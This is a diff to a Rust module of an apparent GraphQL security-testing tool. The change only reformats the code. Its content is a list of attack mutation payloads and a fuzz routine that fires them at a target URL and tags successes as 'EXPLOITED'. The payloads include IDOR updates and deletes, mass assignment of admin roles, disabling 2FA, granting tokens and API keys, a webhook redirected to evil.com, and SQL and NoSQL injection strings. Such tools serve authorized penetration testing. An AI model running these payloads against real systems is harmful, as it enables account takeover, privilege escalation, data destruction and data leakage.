@@ -328,33 +328,97 @@ pub async fn depth(
 }
 
 const MUTATION_FUZZ_PAYLOADS: &[(&str, &str)] = &[
-    ("IDOR — update by ID", r#"{"query":"mutation { updateUser(id: 1, input: {email: \"x@evil.com\"}) { id email } }"}"#),
-    ("IDOR — delete by ID", r#"{"query":"mutation { deleteUser(id: 1) { success } }"}"#),
-    ("Mass assignment — role", r#"{"query":"mutation { updateUser(input: {role: \"admin\"}) { id role } }"}"#),
-    ("Mass assignment — isAdmin", r#"{"query":"mutation { updateUser(input: {isAdmin: true}) { id } }"}"#),
-    ("Mass assignment — verified", r#"{"query":"mutation { updateUser(input: {verified: true}) { id } }"}"#),
-    ("Unauthorized create", r#"{"query":"mutation { createUser(input: {email: \"test@evil.com\", password: \"x\"}) { id } }"}"#),
-    ("Unauthorized admin create", r#"{"query":"mutation { createAdmin(input: {email: \"admin@evil.com\"}) { id role } }"}"#),
-    ("Batch update", r#"{"query":"mutation { updateUsers(ids: [1,2,3], input: {status: \"deleted\"}) { count } }"}"#),
-    ("Batch delete", r#"{"query":"mutation { deleteUsers(ids: [1,2,3,4,5]) { count } }"}"#),
-    ("Permission escalation", r#"{"query":"mutation { updatePermissions(userId: 1, permissions: [\"admin\",\"superuser\"]) { success } }"}"#),
-    ("Password reset abuse", r#"{"query":"mutation { resetPassword(email: \"victim@target.com\") { success } }"}"#),
-    ("Email change no verify", r#"{"query":"mutation { updateEmail(userId: 1, email: \"attacker@evil.com\") { id } }"}"#),
-    ("2FA disable", r#"{"query":"mutation { disable2FA(userId: 1) { success } }"}"#),
-    ("API key generation", r#"{"query":"mutation { generateApiKey(scope: \"admin\") { key } }"}"#),
-    ("Token grant", r#"{"query":"mutation { grantToken(userId: 1, scope: \"*\") { token } }"}"#),
-    ("Webhook override", r#"{"query":"mutation { updateWebhook(url: \"https://evil.com/hook\") { id } }"}"#),
-    ("Config injection", r#"{"query":"mutation { updateConfig(key: \"admin_email\", value: \"attacker@evil.com\") { success } }"}"#),
-    ("SQLi in mutation arg", r#"{"query":"mutation { updateUser(id: \"1' OR '1'='1\", input: {role: \"admin\"}) { id } }"}"#),
-    ("NoSQLi in mutation arg", r#"{"query":"mutation { updateUser(id: {\"$ne\": null}, input: {role: \"admin\"}) { id } }"}"#),
-    ("Introspection in mutation", r#"{"query":"mutation { __schema { types { name } } }"}"#),
+    (
+        "IDOR — update by ID",
+        r#"{"query":"mutation { updateUser(id: 1, input: {email: \"x@evil.com\"}) { id email } }"}"#,
+    ),
+    (
+        "IDOR — delete by ID",
+        r#"{"query":"mutation { deleteUser(id: 1) { success } }"}"#,
+    ),
+    (
+        "Mass assignment — role",
+        r#"{"query":"mutation { updateUser(input: {role: \"admin\"}) { id role } }"}"#,
+    ),
+    (
+        "Mass assignment — isAdmin",
+        r#"{"query":"mutation { updateUser(input: {isAdmin: true}) { id } }"}"#,
+    ),
+    (
+        "Mass assignment — verified",
+        r#"{"query":"mutation { updateUser(input: {verified: true}) { id } }"}"#,
+    ),
+    (
+        "Unauthorized create",
+        r#"{"query":"mutation { createUser(input: {email: \"test@evil.com\", password: \"x\"}) { id } }"}"#,
+    ),
+    (
+        "Unauthorized admin create",
+        r#"{"query":"mutation { createAdmin(input: {email: \"admin@evil.com\"}) { id role } }"}"#,
+    ),
+    (
+        "Batch update",
+        r#"{"query":"mutation { updateUsers(ids: [1,2,3], input: {status: \"deleted\"}) { count } }"}"#,
+    ),
+    (
+        "Batch delete",
+        r#"{"query":"mutation { deleteUsers(ids: [1,2,3,4,5]) { count } }"}"#,
+    ),
+    (
+        "Permission escalation",
+        r#"{"query":"mutation { updatePermissions(userId: 1, permissions: [\"admin\",\"superuser\"]) { success } }"}"#,
+    ),
+    (
+        "Password reset abuse",
+        r#"{"query":"mutation { resetPassword(email: \"victim@target.com\") { success } }"}"#,
+    ),
+    (
+        "Email change no verify",
+        r#"{"query":"mutation { updateEmail(userId: 1, email: \"attacker@evil.com\") { id } }"}"#,
+    ),
+    (
+        "2FA disable",
+        r#"{"query":"mutation { disable2FA(userId: 1) { success } }"}"#,
+    ),
+    (
+        "API key generation",
+        r#"{"query":"mutation { generateApiKey(scope: \"admin\") { key } }"}"#,
+    ),
+    (
+        "Token grant",
+        r#"{"query":"mutation { grantToken(userId: 1, scope: \"*\") { token } }"}"#,
+    ),
+    (
+        "Webhook override",
+        r#"{"query":"mutation { updateWebhook(url: \"https://evil.com/hook\") { id } }"}"#,
+    ),
+    (
+        "Config injection",
+        r#"{"query":"mutation { updateConfig(key: \"admin_email\", value: \"attacker@evil.com\") { success } }"}"#,
+    ),
+    (
+        "SQLi in mutation arg",
+        r#"{"query":"mutation { updateUser(id: \"1' OR '1'='1\", input: {role: \"admin\"}) { id } }"}"#,
+    ),
+    (
+        "NoSQLi in mutation arg",
+        r#"{"query":"mutation { updateUser(id: {\"$ne\": null}, input: {role: \"admin\"}) { id } }"}"#,
+    ),
+    (
+        "Introspection in mutation",
+        r#"{"query":"mutation { __schema { types { name } } }"}"#,
+    ),
 ];
 
 pub async fn fuzz(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
     println!("{} GraphQL Mutation Fuzzing", "[*]".cyan().bold());
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL: {}", "[*]".cyan().bold(), url);
-    println!("{} {} mutation payloads", "[*]".cyan().bold(), MUTATION_FUZZ_PAYLOADS.len());
+    println!(
+        "{} {} mutation payloads",
+        "[*]".cyan().bold(),
+        MUTATION_FUZZ_PAYLOADS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -378,7 +442,10 @@ pub async fn fuzz(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Resul
                     || body.contains("Not authenticated")
                     || body.contains("not authorized");
                 let has_success = body.contains("\"success\":true") || body.contains("\"id\"");
-                let has_sensitive = body.contains("token") || body.contains("key") || body.contains("password") || body.contains("secret");
+                let has_sensitive = body.contains("token")
+                    || body.contains("key")
+                    || body.contains("password")
+                    || body.contains("secret");
 
                 let tag = if has_data && has_success && !has_auth_error {
                     "EXPLOITED".red().bold().to_string()
@@ -402,12 +469,21 @@ pub async fn fuzz(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Resul
                 );
 
                 if has_data && !has_auth_error {
-                    println!("    {} {}", ">".red().bold(), body.chars().take(300).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        body.chars().take(300).collect::<String>()
+                    );
                     results.push((name, has_sensitive, has_success));
                 }
             }
             Err(_) => {
-                println!("  {} [{:02}] {:35} error", "*".red(), results.len() + 1, name);
+                println!(
+                    "  {} [{:02}] {:35} error",
+                    "*".red(),
+                    results.len() + 1,
+                    name
+                );
             }
         }
     }
@@ -426,10 +502,16 @@ pub async fn fuzz(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Resul
     );
 
     if exploited > 0 {
-        println!("{} [CRITICAL] Unauthorized mutations executed — IDOR/mass assignment confirmed!", "[!]".red().bold());
+        println!(
+            "{} [CRITICAL] Unauthorized mutations executed — IDOR/mass assignment confirmed!",
+            "[!]".red().bold()
+        );
     }
     if sensitive_count > 0 {
-        println!("{} [HIGH] Sensitive data in mutation responses — credential/token exposure!", "[!]".red().bold());
+        println!(
+            "{} [HIGH] Sensitive data in mutation responses — credential/token exposure!",
+            "[!]".red().bold()
+        );
     }
 
     Ok(())
